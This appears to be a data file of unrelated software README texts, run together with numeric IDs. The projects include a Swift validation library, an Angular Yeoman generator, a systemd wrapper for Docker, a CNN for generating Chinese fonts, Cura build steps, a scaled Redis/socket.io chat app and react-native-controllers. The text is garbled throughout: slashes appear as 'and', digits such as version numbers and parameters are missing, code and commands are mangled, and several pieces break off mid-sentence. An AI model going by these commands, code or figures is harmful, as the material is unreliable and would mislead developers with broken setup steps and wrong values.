label for a particular field in the form view defaultvalue a default value for the field this works for primitive types arrays objects and arrays of objects and arrays note that for recursive formfield definitions the more deeply nested defaultvalue s will take precedence isrequired if true it will automatically validate using the formgenerator validators nonempty validator hidden if true the field will be hidden from the form view but its defaultvalue will show up in the parsed form data after submission note that hidden fields do not need to have a type validate a validator function whose first argument is the value of the field at the time of validation and whose return value is some error message in case where the value does not pass some predicate test validators the same as validate but for multiple validators here is a list of currently built in validator generators located in the formgenerator validators object each one returns a validator function that takes in a

52495765, validated is a  library  source lines of code that allows you make better use of swift s type system by providing tools for easily generating new types with built in guarantees validated allows you to use the type system to verify properties of your values providing a new level of compile time guarantees using validators you can define new types that add guarantees to existing types and and create a new string type that can never be empty typealias nonemptystring validated string nonemptystringvalidator you might have a function in your code that only knows how to work with a user value when the user is logged in usually you will implement this requirement in code add documentation but you don t have an easy way of expressing this invariant in the type signature and and and please ever only call with a logged in user func performtaskwithuser user user precondition user loggedin it is illegal to call this method with a logged out user using validated you can quickly create a new type that describes this requirement in the type system that makes it impossible to call the function with a logged out user and it makes the method signature express your invariant instead of relying on documentation func performtaskwithuser user loggedinuser so how is this new loggedinuser type created first you need to implement a validator struct loggedinvalidator validator static func validate value user bool return value loggedin a validator needs to implement the validate function that takes the type that this validator can validate in this case a user the funtion returns a bool return true if the requirements are fulfilled and false if not with the validator in place we can create our new type like this typealias loggedinuser validated user loggedinvalidator note that it is not required to provide a typealias but for most cases it is recommended and that s it loggedinuser now has a failable initializer that takes a user if the passed in user fulfills the logged in requirement you will have a loggedinuser  otherwise nil additionally loggedinuser provides a throwing initializer in case you prefer to handle failed validations as errors instead of nil values the underlying value the full user value is stored in the value property of loggedinuser validated provides some further features that might be non obvious validated offers validator types for logical operations that allow you to require multiple validations in different combinations e g you can use the and validator to require that two requirements must be met for your type to intializer typealias allcapsnonemptystring validated string and nonemptystringvalidator allcapslatinstringvalidator or and not are provided as additional validators you can take a look at the specs for additional examples a validator can itself be generic this is useful if you want to provide verifications for a whole category of types the example validator nonemptycollectionvalidator can be applied to all validator types by using a generic requirement struct nonemptycollectionvalidator t collectiontype validator static func validate value t bool if value isempty return true else return false  however when using this validator to create a type you will have to specify the exact type of collection you want to validate typealias nonemptylistofstrings validated string  nonemptycollectionvalidator string no not really dependent types would allow us to define types solely based on values this library only allows us to validate if a type is of a specified type t based on its value and a validator the value itself doesn t change the type information truely dependent types would create the following results    and and type array count  type int     and and type array count  type int using validated we can only verify if a type falls into one of our statically defined categories listof  and and type listof array int listof  and and type nil however these statically provided checks can still add a lot of value to your code see the examples above validated is available via the usual suspects you can install validated via cocoapods by adding it to your podfile useframeworks platform ios   pod validated and run pod install you can install validated via carthage by adding the following line to your cartfile github ben g and validated

10766302, and newer modern generator for angular and webpack and and and yeoman generator for enterprise angular projects provides a directory structure geared towards large angular projects each controller service filter and directive are placed in their own file all files related to a conceptual unit are placed together for example the controller html less and unit test for a partial are placed together in the same directory provides a ready made grunt build that produces an extremely optimized distribution grunt serve task allows you to run a simple development server with watch and livereload enabled additionally jshint and the appropriate unit tests are run for the changed files integrates bower for package management includes yeoman subgenerators for directives services partials filters and modules integrates less and includes bootstrap via the source less files allowing you to reuse bootstrap vars and mixins and etc easily testable each sub generator creates a skeleton unit test unit tests can be run via grunt test and they run automatically during the grunt watch that is active during grunt serve directory layout  all subgenerators prompt the user to specify where to save the new files thus you can create any directory structure you desire including nesting the generator will create a handful of files in the root of your project including index html  app js  and app less you determine how the rest of the project will be structured in this example the user has chosen to group the app into an admin folder a search folder and a service folder app less main app wide styles app js angular module initialization and route setup index html main html file gruntfile js grunt build file and admin example admin module folder admin js admin module initialization and route setup admin less admin module less and admin directive angular directives folder admin directive js example simple directive admin directive spec js example simple directive

img images not created by default but included in and dist if added and dist distributable version of app built using grunt and gruntfile js and bowercomponent rd party libraries managed by bower and nodemodules npm managed libraries used by grunt getting started  prerequisites node grunt yeoman and bower once node is installed do npm install g grunt cli yo bower next install this generator npm install g generator cg angular to create a project mkdir mynewawesomeapp cd mynewawesomeapp yo cg angular grunt tasks  now that the project is created you have  simple grunt commands available grunt serve this will run a development server with watch livereload enabled grunt test run local unit tests grunt build places a fully optimized minified concatenated and more in and dist when grunt serve is running any changed javascript files will be linted using jshint as well as have their appropriate unit tests executed only the unit tests that correspond to the changed file will be run this allows for an efficient test driven workflow yeoman subgenerators  there are a set of subgenerators to initialize empty angular components each of these generators will create one or more skeleton files javascript less html spec etc for the component type update index html and add the necessary script tags update app less and add the import as needed for partials update the app js adding the necessary route call if a route was entered in the generator prompts there are generators for directive  partial  service  filter  module  and modal running a generator yo cg angular directive my awesome directive yo cg angular partial my partial yo cg angular service my service yo cg angular filter my filter yo cg angular module my module yo cg angular modal my modal the name paramater passed i e my awesome directive will be used as the file names the generators will derive appropriate class names from this parameter ex my awesome directive will convert to a class name of myawesomedirective each sub generator will ask for the folder in which to create the new skeleton files you may override the default folder for each sub generator in the yo rc json file the modal subgenerator is a convenient shortcut to create partials that work as modals for bootstrap v and angular ui bootstrap v  both come preconfigured with this generator if you choose not to use either of these libraries simply don t use the modal subgenerator subgenerators are also customizable please read customizing md customizing md for details submodules  submodules allow you to more explicitly separate parts of your application use the yo cg angular module my module command and specify a new subdirectory to place the module into once you ve created a submodule running other subgenerators will now prompt you to select the module in which to place the new component preconfigured libraries  the new app will have a handful of preconfigured libraries included this includes angular   bootstrap  angularui bootstrap fontawesome jquery lodash less and momentx you may of course add to or remove any of these libraries but the work to integrate them into the app and into the build process has already been done for you build process  the project will include a ready made grunt build that will build all the less files into one minified css file concatenates and minifies all javascript into one file replaces all appropriate script references in index html with the minified css and js files optionally minifies any images in and img minifies the index html copies any extra files necessary for a distributable build ex font awesome font files etc the resulting build loads only a few highly compressed files importantly grunt dom munger uses css attribute selectors to manage the parsing of the script and link tags its very easy to exclude certain scripts or stylesheets from the concatenated files this is often the case if you re using a cdn this can also be used to prevent certain development scripts from being included in the final build to prevent a script or stylesheet from being included in concatenation put a data concat false attribute on the link or script tag this is currently applied for the livereload js and less js script tags to prevent a script or link tag from being removed from the finalized index html  use a data remove false attribute release history   and  and  v  upgrades to the bower components including angular to version    and  and  v   switch from ngmin to ng annotate disabling grunt contrib imagemin so windows users don t encounter its issues subgenerators prompt for a name if not entered other fixes  and  and  v   fix for directive template urls with backslashes on windows  and  and  v   fix for backslashes being used in injected routes and tags on subgenerators  and  and  v   new subgenerators for modules and modals replaced grunt contrib jasmine with grunt karma karma allows us to test against actual browsers other than phantomjs  and  and  v   fix for directive files not being named correctly fix for htmlmin from affecting some bootstrap styles  and  and  v   all subgenerators now ask the user for a directory enabling any user defined project structure gruntfile has been altered to allow scripts partials and less files to be located anywhere in the project directory structure an option to use angular ui router is now available when initializing a new project js and setup js and css and app less moved to app js and app less grunt server is now grunt serve inside index html all user script tags are grouped together instead of split out into groups for services and filters and etc new ability to customize the subgenerators  and  and  v   fix for the directive spec file named with a less extension  and  and  v   nice enhancements for unit testing specs are now placed in the same directory as the component they re testing additionally unit tests are now run during grunt server allowing for an easy and efficient test driven workflow  and  and  v   big update angular   and bootstrap  newer versions of angular ui font awesome and jquery lodash was replaced with underscore lots of other small changes  and  and  v   fixed templating issue with generated specs for yo cg angular service subgenerator  and  and  v   renamed and lib back to and bowercomponents as clarity trumps brevity renamed and bin to and dist fixed spelling error in generated directive s js template location moved up to later version of yeoman generator dependency to solve cannot read bold of undefined error coming from yeoman jshint options now read from jshintrc and more small stuff  and  and  v   added utf charset to index html fix for emfile too many open files on grunt watch by no longer watching the lib folder  and  and  v   fixed a ton of known issues replaced grunt regarde with grunt contrib watch fixed and tweaked the unit test specs and grunt test fixed issues with the build generator is now

22713483, systemd docker  this is a wrapper for docker run so that you can sanely run docker containers under systemd the key thing that this wrapper does is move the container process from the cgroups setup by docker to the service unit s cgroup this handles a bunch of other quirks so please read through documentation to get an understanding of all the implications of running docker under systemd using this wrapper you can manage containers through systemctl or the docker cli and everything should just stay in sync additionally you can leverage all the cgroup functionality of systemd and systemd notify why i wrote this  installation  copy systemd docker to and opt and bin really anywhere you want you can download and compile through the normal go get github com and ibuildthecloud and systemd docker quick usage  basically in your unit file use systemd docker run instead of docker run here s an example unit file that runs nginx description nginx after docker service requires docker service service execstart and opt and bin and systemd docker run rm name n nginx restart always restartsec s type notify notifyaccess all timeoutstartsec  timeoutstopsec  install wantedby multi user target if you are writing your own unit file type notify and notifyaccess all is really important special note about named containers  in short it s best to always have name n rm in your unit file s execstart the best way i ve found to run containers under systemd is to always assign the container a name even better is to put name n in your unit file and then the name of the container will match the name of the service unit if you don t name your container you will essentially be creating a new container on every start that will get orphaned you re probably clever and thinking you can just add rm and that will take care of the orphans the problem with this is that rm is not super reliable by naming your container systemd docker will take extra care to keep the systemd unit and the container in sync for example if you do name n rm  systemd docker will ensure that the container is really deleted each time the issue with rm is that the remove is done from the client side if the client dies the container is not deleted if you do name n rm  systemd docker on start will look for the named container if it exists and is stopped it will be deleted this is really important if you ever change your unit file if you change your execstart command and it is a named container the old values will be saved in the stopped container by ensuring the container is always deleted you ensure the args in execstart are always in sync by default the container s stdout and stderr will be piped to the journal if you do not want to use the journal add logs false to the beginning of the command for example execstart and opt and bin and systemd docker logs false run rm name n nginx environment variables  using environment and environmentfile  systemd can set up environment variables for you but then unfortunately you have to do run e abc abc e xyz xyz in your unit file you can have the systemd environment variables automatically transfered to your docker container by adding env this will essentially read all the current environment variables and add the appropriate e flags to your docker run command for example environmentfile and etc and environment execstart and opt and bin and systemd docker env run rm name n nginx the contents of and etc and environment will be added to your docker run command the main magic of how this works is that the container processes are moved from the docker cgroups to the system unit cgroups by default all application cgroups will be moved this means by default you can t use cpuset or m in docker if you don t want to use the systemd cgroups but instead use the docker cgroups you can control which cgroups are transfered using the cgroups option minimally you must set name systemd otherwise systemd will lose track of the container for example execstart and opt and bin and systemd docker cgroups name systemd cgroups cpu run rm name n nginx the above command will use the name systemd and cpu cgroups of systemd but then use docker s cgroups for all the others like the freezer cgroup if for whatever reason you want to create a pid file for the container pid you can just add pid file as below execstart and opt and bin and systemd docker pid file and var and run and n pid env run rm name n nginx systemd notify support  by default systemd docker will send ready  to the systemd notification socket you can instead delegate the ready  call to the container itself this is done by adding notify for example execstart and opt and bin and systemd docker notify run rm name n nginx detaching the client  the d argument to docker has no effect under systemd docker to cause the systemd docker client to detach after the container is running simply use logs false rm false if either logs or rm is true the systemd docker client will stay alive until it is killed or the container exits running on coreos  if you are running on coreos it may be more problematic to install systemd docker to and opt and bin to make this easier add the following line to your unit file execstartpre and usr and bin and docker run rm v and opt and bin and opt and bin ibuildthecloud and systemd docker that command will install systemd docker to and opt and bin the full nginx example that is above would now be as below description nginx after docker service requires docker service service execstartpre and usr and bin and docker run rm v and opt and bin and opt and bin ibuildthecloud and systemd docker execstart and opt and bin and systemd docker run rm name n nginx restart always restartsec s type notify notifyaccess all timeoutstartsec  timeoutstopsec  install wantedby multi user target known issues  centos  is inconsistent in the way it handles some cgroups it has  cpuacctcpu and user slice in and proc and pid and cgroups which is inconsistent with the cgroup path and sys and fs and cgroup and cpucpuacct and that systemd docker is trying to move pids to this will cause systemd docker to fail unless run with systemd docker cgroups name systemd run

to code their own linear picker view there is a public api available to build upon this view can be inflated and appended to a layout to control what the view draws to the screen a linearpickeradapter should be provided there are currently  ways to create your own adapter this is the most barebones and also most complex way of the two methods but it allows for the highest level of customization and can provide stunning results following methods have to be implemented and and should provide the number of large pips to display constant value int getlargepipcount and and should provide the number of small pips between  large pips to display constant value int getsmallpipcount and and should provide the number of invisible pips or substeps between any  visible pips can vary between pips and and for more info on the visiblepipindex see the pip section below int getinvisiblepipcount int visiblepipindex and and this method is called once by the linearpickerview every time it draws itself and and you can use this to draw a custom background as all the other elements will be drawn on top and and the array elementbounds contains the exact space and location that every element on the linear dial may use void ondraw canvas canvas rect elementbounds gravity gravity and and this method is called by the linearpickerview every time a dial element has to be drawn and and index denotes the visible pip index of the dial element see pip section and and bounds gives a hint to where you should draw the dial element and also the size of the element and and yoffset an yoffset of f corresponds to a dial element that is located the distance between and and  big pips from the handle in the picker examples this is used to fade out the small pips and and gravity currently unused part of a future api void ondrawelement int index canvas canvas rect bounds float yoffset gravity gravity and and this method is called last draw the handle here and and index corresponds to the currently selected visible pip index and and intermediate corresponds to the invisible pip step  visible pip selected  invisible pip selected and and bounds the bounds inside which you should draw the handle

intermediate canvas canvas rect bounds gravity gravity screenhalf occluded this abstract class implements the required linearpickeradapter and provides a complete solution for getting similar results as the two provided pickers in case you just want to display a handle with text that scrolls through a linear dial in which the pips also contain just text this is an optimal solution there s only  methods that need to be implemented and and this method provides a pip index of all visible pips and expects the and and text value to display next to this pip protected abstract string getlabeltext int index and and this method provides the index of the currently selected pip and the index of the selected invisible pip and and it expects the string to display on the handle protected abstract string gethandletext int index int step and and the following  methods originate from the linearpickeradapter interface and and should provide the number of large pips to display constant value int getlargepipcount and and should provide the number of small pips between  large pips to display constant value int getsmallpipcount and and should provide the number of invisible pips or substeps between any  visible pips can vary between pips and and for more info on the visiblepipindex see the pip section below int getinvisiblepipcount int visiblepipindex to make use of the adapter in this library it is important you have a good understanding of what the different pip types are and how each type is addressed there are in total  pip types  large pip this is the largest visible pip that signifies a top level entry e g a full hour in the time picker  small pip this is the smaller visible pip kind that signifies a sub entry e g  minute increments in the time picker  invisible pip these are further sub entries between the different visible pips e g  minute increments in the time picker let s assume the following example and and the visiblepipindex argument is the relative index to the total visible pip count and and large pip count  and and small pip count  and and total visible pip count    and   and and  and and  and and  and and  and and  and and  and and  and and  and and  and and  and and if now a visiblepipindex of  is passed you know this is located inside floor  and  and   the first large pip and and on the   and   second small pip  would be the large pip itself visible pips are always addressed by using an index relative to the total visible pip count above example illustrates how one would derive the relevant pip from this index when an invisible pip is addressed it is always by both the visible pip index described above and a second step index that indicates the index of the invisible pip or step relative to the visible pip index it is important to note that invisible pips do not use an index that is relative to the total amount of pips as that would be extremely complex to derive a position from

71961530, creating font is a hard business creating a chinese font is an even harder one to make a gbk a character set standardized by chinese government compatible font designers will need to design unique looks for more than  chinese characters a daunting effort that could take years to complete what about the designer just creates a subset of characters then let computer figures out what the rest supposed to look like after all chinese characters are consisting of a core set of radicals      and the same radical looks pretty similar on different characters alt network images and boxforideas png after trying various different architectures including more sophisticated ones with residuals and deconvolution i ended up with a more traditional flavour top down cnn structure as shown below alt network images and structure png each convolutional layer is followed by a batch normalization layer then a relu layer and zero padding all the way down layer number n is configurable the larger n tends to generate more detailed and cleaner output but takes longer time to train usual choice is between   choice larger than  seems hitting the point of diminishing return increasing in running time but no noticeable improvement on either loss or output big convolutions for better details during my experiments i started out using stacked straight up plain x convolutions but it end up performing badly or not converging on more difficult and exotic fonts so i end up this trickling down shape architecture with various size of convolutions on different layers each contains about the same number of parameters so the network can capture details at different level dropout is essential for convergence without it the network simply gives up or trapped in trivial solutions like all white or black images fully connected layers used in both erik and shumeet s work didn t work very well for chinese characters generating noisier and unstable output my guess is that chinese characters are much more complex in structure and by nature closer to images than letters so a cnn based approach makes more sense in this case unlike real world image we can generate image of a character with arbitrary resolution this fact can be exploited to use a high res source image to approximate a low res target thus more details are preserved and to avoid blurriness and noise the image on the top shows the progress of model made on validation set during training on various fonts all of the them are trained on  examples with layer number set to  it is pretty interesting to see how the model slowly converges from random noise to first capture the recognizable shape of a character then to more nuanced details below is the progress captured for a single font during training the image below shows the predicted result versus ground truth for each font we take  most used characters as training set running for  iterations a test set with  characters are used for inference for all the fonts the source font is simsun for majority of the fonts the network succeeds to make reasonable guesses some of them are actually very close to the ground truth also worth noting the tiny but distinguishable details are preserved by the network like the curly end of radicals but just like many other neural network powered applications when the network fails it fails spectacularly for some fonts especially the ones that are light in weight it merely comes up some blurry inky blob on the other hand for those heavy fonts it loses critical details of blanks to make the character distinguishable only capturing the overall outline even in the successful cases the loss of parts of radicals seems like a common problem also network seems to do better on songti family   or    of fonts but didn t do well on kaiti    which may due to the fact that simsun itself is a songti font  characters may be  of the whole gbk standard but these are still a lot of characters i choose the number out of my instinct and it seems work well for many fonts but is it really necessary to figure this out i pick one font it takes way too much time to carry this experiment on every font sadly  run an experiment with number of training examples ranging from  to  and ask the model to render characters on a common test set below shows the result the above image shows from top to bottom the effect of increasing size of training set from  to  the improvement becomes smaller between training  and  which indicates that the sweet point is somewhere in between to use this package tensorflow is required to be installed tested on    version other python requirements are listed in the requirements txt also a gpu is highly recommended if you expect to see the result in reasonable amount of time all experiments run on one nvidia gtx  for  iterations with batch size  it takes the small model about  minutes to finish while  minutes for the medium one and  hours for big model prior to training you need to run the preprocess script to generate character bitmaps for both source and target fonts python preprocess py sourcefont src ttf targetfont tgt otf charlist charsets and topsimplified txt savedir pathtosavebitmap the preprocess script accepts both truetype and opentype fonts take a list of characters some common charsets are builtin in the charsets directory in this repo like the top  most used simplified chinese characters then save the bitmaps of those characters in npy format by default for the source font each character will be saved with font size  on a x canvas and target font with size  on x canvas with respect no special alignment is needed here just make sure characters don t get truncated after the preprocess step assume you already have the bitmaps for both source and target fonts noted as src npy and tgt npy  run the below command to start the actual training python rewrite py mode train model medium sourcefont src npy targetfont tgt npy iter  numexamples  numvalidations  tv   alpha   keepprob   numckpt  ckptdir pathtosavecheckpoints summarydir pathtosavesummaries framedir pathtosaveframes some explanations here mode can be either train or infer  the former is self explanatory and we will talk about the infer mode later model here represents the size of the model  options are available small medium or big with respect to the number of layers equal to  tv the weight for the total variation loss default to   if the output looks broken or jarring you can choose to boost it to force the model to generate smoother output alpha the alpha slope used by leaky relu enable it might see some improvement for certain fonts but subject to longer training time keepprob represents the probability a value passing through the dropout layer during training this is actually a very important parameter the higher the probability the sharper but potentially broken output is expected if the result is not good you can try to lower value down for a noisier but rounder shape typical options are   or   ckptdir the directory to store model checkpoints used for latter inference step summarydir if you wish to use tensorboard to visualize some metrics like loss over iterations this is the place to save all the summaries default to and tmp and summary you can check the loss for training batch as well as on validation set and the breakdown of it framedir the directory to save the captured output on validation set used to pick the best model for inference after the training you can also find a file named transition gif to show you the animated progress the model made during training also on validation set for other options you can use the h checkout the exact usage case suppose we finish training finally  now we can use the infer mode mentioned previously to see how the model is doing on unseen characters you can refer to the captured frames in the framedir to help you pick the model that you are most satisfied with spoiler it is usually not the one with minimum error run the following command python rewrite py mode infer model medium sourcefont src npy ckpt pathtoyourfavoritemodelcheckpoints bitmapdir pathtosavetheinferredoutput note the sourcefont can be different from the one used in training in fact it can even be any other font but it is better to choose the same or similar font for inference for good output after the inference you will find series of images for all output characters and a npy file that contains the inferred character bitmaps this project started out as a personal project to help me learning and understanding tensorflow but shapes up to be something more interesting that i think worthy sharing with more people currently the network can only manages to learn one style at a time it will be interesting to see how to extend it to handle multiple styles at once  characters are fewer than  of the complete gbk sets but it is still a lot of characters is it possible to learn style with something fewer than  characters my guess is gan generative adversarial network could be really useful to try for this purpose on network design this architecture is proven effective on different fonts but what is the optimal number of layers for each size of convolutions remains to be figured out or whether some convolution layers are necessary at all another interesting direction i would love to explore is create font with mixed styles simply combining two fonts in the loss function didn t work well maybe we should train a vgg network just for fonts then hijacking the feature maps or potentially more novel change in network design is required to tackle this last but not least this project demonstrates a possibility of applying deep learning more specifically cnn in helping accelerating design process for chinese fonts the results are promising and encouraging but not quite there to magically create new font out of box nor it is part of the claim of this project thanks my friend guy for helping me build a pc with a reasonable budget
2972696, read this it s important  development  cura is developed in python with a c and and engine the part you are looking at right now is the python gui  packaging  cura development comes with a script package sh  this script has been designed to run under nix oses linux macos freebsd for windows the package sh script can be run from bash using git the package sh script generates a final release package you should not need it during development unless you are changing the release process if you want to distribute your own version of cura then the package sh script will allow you to do that the package sh script understands a number of envrionement variables defined at the top of the script review and adjust settings to match your needs both macos and linux require some extra instructions for development as you need to prepare an environment look below at the proper section to see what is needed fedora builds cura by using mock  thereby enabling it to build rpms for every distribution that mock has a configuration file for in pratice this means that fedora can build rpms for several versions of fedora centos and rhel cura can be built under a regular user account there is no need to have root privileges in fact having root privileges is very much discouraged however the user account under which the build is performed needs to be a member of the mock group this is accomplished as follows sudo usermod a g mock whoami to install the software that is required to build cura run the following commands sudo yum install y git rpmdevtools rpm build mock arduino sudo mkdir p and usr and share and arduino and hardware and tools and avr sudo ln sf and usr and bin and usr and share and arduino and hardware and tools and avr and bin to build and install cura run the following commands and package sh fedora sudo yum localinstall y scripts and linux and fedora and rpms and cura rpm examples of building other configurations and package sh fedora fedora rawhide x cfg fedora rawhide i cfg and package sh fedora and etc and mock and fedora  x cfg and etc and mock and fedora rawhide i cfg debian and ubuntu linux to build and install cura run the following commands

7288336, this project is now updated to use node  x not backward compatible in addition it uses all latest modules of express socket io etc you can start app by type debug redispubsub node bin and www one of the most common things people build on node js are real time apps like chat apps social networking apps etc there are plenty of examples showing how to build such apps on the web but it s hard to find an example that shows how to deal with real time apps that are scaled and are running with multiple instances you will need to deal with issues like sticky sessions scale up and down instance crash and restart and more for apps that will scale this post will show you how to manage these scaling requirements the main objective of this project is to build a simple chat app and focus on tackling such issues specifically we will be building a simple express socket io and redis based chat app that should meet the following objectives  chat server should run with multiple instances  the user login should be saved in a session if the user refreshes the browser he should be logged back in socket io should get user info from the session before sending chat messages socket io should only connect if user is already logged in  reconnect while the user is chatting if the server instance to which he is connected goes down and is restarted and scaled down the user should be reconnected to an available instance and recover the session chat app s login page chat app s chat page along the way we will cover  how to use socket io and sticky sessions  how to use redis as a session store  how to use redis as a pubsub service  how to use sessions sockets io to get session info like user info from express sessions  how to configure socket io client and server to properly reconnect after one or more server instances goes down i e has been restarted and scaled down and has crashed when you run such a server in a cloud that has a load balancer and reverse proxy routers etc you need to configure it to work properly especially when you scale the server to use multiple instances one of the constraints socket io sockjs and similar libraries have is that they need to continuously talk to the same instance of the server they work perfectly well when there is only  instance of the server when you scale your app in a cloud environment the load balancer nginx in the case of cloud foundry will take over and the requests will be sent to different instances causing socket io to break to help in such situations load balancers have a feature called sticky sessions aka session affinity the main idea is that if this property is set then after the first load balanced request all the following requests will go to the same server instance in cloud foundry cookie based sticky sessions are enabled for apps that set the cookie jsessionid note jsessionid is the cookie name commonly used to track sessions in java and spring applications cloud foundry is simply adopting that as the sticky session cookie for all frameworks so all the apps need to do is to set a cookie with the name jsessionid to make socket io work javascript use cookieparser and session middlewares together by default express and connect app creates a cookie by name connect sid but to scale socket io app make sure to use cookie name jsessionid instead of connect sid use cloud foundry s sticky session feature w and o this socket io won t work if you have more than  instance if you are not running on cloud foundry having cookie name jsessionid doesn t hurt it s just a cookie name app use cookieparser app use express session store sessionstore key jsessionid  secret your secret here in the above diagram when you open the app  express sets a session cookie with name jsessionid  when socket io connects it uses that same cookie and hits the load balancer  the load balancer always routes it to the same server that the cookie was set in let s imagine that the user is logging in via twitter or facebook or we implement a regular login screen we are storing this information in a session after the user has logged in javascript app post and login  function req res and and store user info in session after login req session user req body user once the user has logged in we connect via socket io to allow chatting however socket io doesn t know who the user is and whether he is actually logged in before sending chat messages to others that s where the socket io express session library comes in it s a very simple library that s a wrapper around socket io all it does is grab session information during the handshake and then pass it to socket io s connection function you can access session via socket handshake session w and in connection listener javascript and and instead of io sockets on connection  function socket and and do pubsub here var socketioexpresssession require socket io express session io use socketioexpresssession app session and and session support and and but with sessions sockets io you ll get session info use sessionsockets so that we can exchange set and get user data b and w sockets and http sessions pass jsessionid custom cookie name that we are using to make use of sticky sessions var sessionsockets require session socket io var sessionsockets new sessionsockets io sessionstore cookieparser jsessionid io on connection  function socket and and get info from session var user socket handshake session user and and close socket if user is not logged in if user socket close and and do pubsub socket emit chat  user user msg logged in so far so good but express stores these sessions in memorystore by default memorystore is simply a javascript object it will be in memory as long as the server is up if the server goes down all the session information of all users will be lost we need a place to store this outside of our server but it should also be very fast to retrieve that s where redis as a session store come in let s configure our app to use redis as a session store as below javascript use redis for session store redis will keep all express sessions in it var redis require redis var redisstore require connect redis express var rclient redis createclient var sessionstore new redisstore client rclient and and and pass sessionstore to express s session middleware s store value  app use express session store sessionstore key jsessionid  secret your secret here with the above configuration sessions will now be stored in redis also if one of the server instances goes down the session will still be available for other instances to pick up so far with the above setup our sessions are taken care of but if we are using socket io s default pub sub mechanism it will work only for  sever instance i e if user and user are on server instance  they can both chat with each other if they are on different server instances they cannot do so javascript sessionsockets on connection  function err socket session socket on chat  function data socket emit chat  data and and send back to browser socket broadcast emit chat  data and and send to others socket on join  function data socket emit chat  msg user joined socket broadcast emit chat  msg user joined in order to send chat messages to users across servers we will update our server to use redis as a pubsub service along with session store redis natively supports pub sub operations all we need to do is to create a publisher a subscriber and a channel and we will be good javascript and and we will use redis to do pub sub create two redis connections a pub for publishing and a sub for subscribing subscribe sub connection to chat channel var sub redis createclient var pub redis createclient sub subscribe chat sessionsockets on connection  function err socket session socket on chat  function data pub publish chat  data socket on join  function data pub publish chat  msg user joined use redis sub subscriber client to listen to any message from redis to server when a message arrives send it back to browser using socket io sub on message  function channel message socket emit channel message the app s architecture will now look like this our app will work fine as long as all the server instances are running what happens if the server is restarted or scaled down or one of the instances crash how do we handle that let s first understand what happens in that situation the code below simply connects a browser to server and listens to various socket io events javascript connect to socket io on the server before fix var host window location host split  socket on connect  function console log connected socket on connecting  function console log connecting socket on disconnect  function console log disconnect socket on connectfailed  function console log connectfailed socket on error  function err console log error and err socket on reconnectfailed  function console log reconnectfailed socket on reconnect  function console log reconnected socket on reconnecting  function console log reconnecting while the user is chatting if we restart the app on localhost or on a single host  socket io attempts to reconnect multiple times based on configuration to see if it can connect if the server comes up with in that time it will reconnect so we see the below logs if the user is chatting on the same app that s running on cloud foundry and with multiple instances  and if we restart the server say using vmc restart redispubsub then we ll see the following log messages you can see that in the above logs after the server comes back up socket io client running in the browser isn t able to connect to socket io server running on node js in the server this is because once the server is restarted on cloud foundry instances are brought up as if they are brand new server instances with different ip addresses and different ports and so jsessionid is no longer valid that in turn causes the load balancer to load balance socket io s reconnection requests i e they are sent to different server instances causing the socket io server not to properly handshake and consequently to throw client not handshaken errors first we will disable socket io s default reconnect feature and then implement our own reconnection feature in our custom reconnection function when the server goes down we ll make a dummy http get call to index html every   seconds if the call succeeds we know that the express server has already set jsessionid in the response so then we ll call socket io s reconnect function this time because jsessionid is set socket io s handshake will succeed and the user will get to continue chatting happily javascript connect to socket io on the server fix var host window location host split  and and disable socket io s default reconnect feature var intervalid var reconnectcount  socket on disconnect  function console log disconnect and and retry reconnecting every  seconds intervalid

45825353, important truly native side menu drawer instead of the js based alternatives available today smoother animations improved performance and look and feel that matches the os for all ios versions versions  x x support react native       versions  x x support react native    and due to breaking changes in react native note the main purpose of this package is to generate discussion around difficulties we found wrapping native ios skeleton components with react native look at this as a thought experiment with a proposed solution if you have alternate ideas please share your feedback why do we need this package why do we need this package what sacrifices did we make what sacrifices did we make installation installation usage usage api api available view controllers available view controllers credits credits release notes changes md license license if you re already convinced you need this package you can skip straight to installation installation if not brace yourself for a long read at wix we came to react native from a codebase of two separate fully native stacks one for ios objectivec and one for android java the main benefits react native brings to such an environment are ota business logic updates fix bugs in the js bundle without going through the app stores improving development velocity and introducing more people in the organization to app development maintaining our existing high level of ux since our entire ui is fully native and implemented separately the last point is critical and what prevented us from adopting many of the cross platform mobile technologies that popped up in recent years one of the premises of react native is that you can keep using any native ui component and won t be required to make ux compromises after working with react native we noticed that we were encouraged to make ux compromises in several places here are two examples it s interesting to see that both examples revolve around components that are parts of the app skeleton why are skeleton components so challenging to implement with native elements our first instinct for both of the examples listed above was hey great let s make these components ourselves it s a great void to fill for the community furthermore let s take a look at the standard way react native hooks into appdelegate rctrootview rootview rctrootview alloc initwithbundleurl jscodelocation modulename defaultproject initialproperties nil launchoptions launchoptions self window uiwindow alloc initwithframe uiscreen mainscreen bounds uiviewcontroller rootviewcontroller uiviewcontroller alloc init rootviewcontroller view rootview self window rootviewcontroller rootviewcontroller the entire react native component hierarchy is contained inside a view and this view is wrapped manually in a view controller that pretty much summed up our problem app skeletons in ios are built from view controllers but it wasn t obvious to us how those fit in within the react native world if our assumption is correct then giving view controllers a more prominent seat at the table might make skeleton components easier to implement with the standard way to use react native rctrootview starts at the very top of your app hierarchy filling the content of rootviewcontroller we wanted to move rctrootview a little lower the top of the app hierarchy will be filled with natively implemented view controllers inside every view controller the content view could be a separate rctrootview the basis of the proposed approach is that the view controller layer is not implemented as traditional react native components instead they are implemented natively we also want to make layouting very flexible so instead of having to write native objectivec code inside xcode to specify which view controllers you want we prefer a declarative way the natural choice to define layouts is using xml this implies that we need to add an additional xml layout file to the project that will be saved right next to the react native js bundle the native package code will then parse this xml file and instantiate the native view controllers when the app is loaded we need this package because it allows us to easily wrap native components that are part of the app skeleton and rely on uiviewcontroller instead of uiview some examples of these skeleton components are navigation tabs and side menu drawer using this package we are able to use the original native components instead of compromising on pure js alternatives by using the proposed approach we made several scarifices that you should be aware of important make sure you are using react native version     run npm install react native controllers save in your project root check out the ios example project under and example example to see everything in action for a detailed explanation of how to modify your project follow the  steps below since react native controllers takes over the skeleton of your app we re first going to change how react native is invoked in appdelegate m in xcode change your appdelegate to look like this implementation appdelegate bool application uiapplication application didfinishlaunchingwithoptions nsdictionary launchoptions nsurl jscodelocation and and option  load js code from development server and and option  load js from pre bundled file on disk and and jscodelocation nsbundle mainbundle urlforresource main withextension jsbundle self window uiwindow alloc initwithframe uiscreen mainscreen bounds and and this is your new react native invocation rccmanager sharedinstance initbridgewithbundleurl jscodelocation launchoptions launchoptions return yes with react native every js file in your project is a module with react native controllers  you can have js modules that deal with viewcontrollers and you can have js modules that deal with views these are the react native modules that you re used to it s not recommended to deal with both in the same js module roughly speaking viewcontrollers make the skeleton of your app and views make the actual content of every screen since index ios js is where your skeleton is defined this module will be dedicated to deal with viewcontrollers normally this would be the only module that does that and the 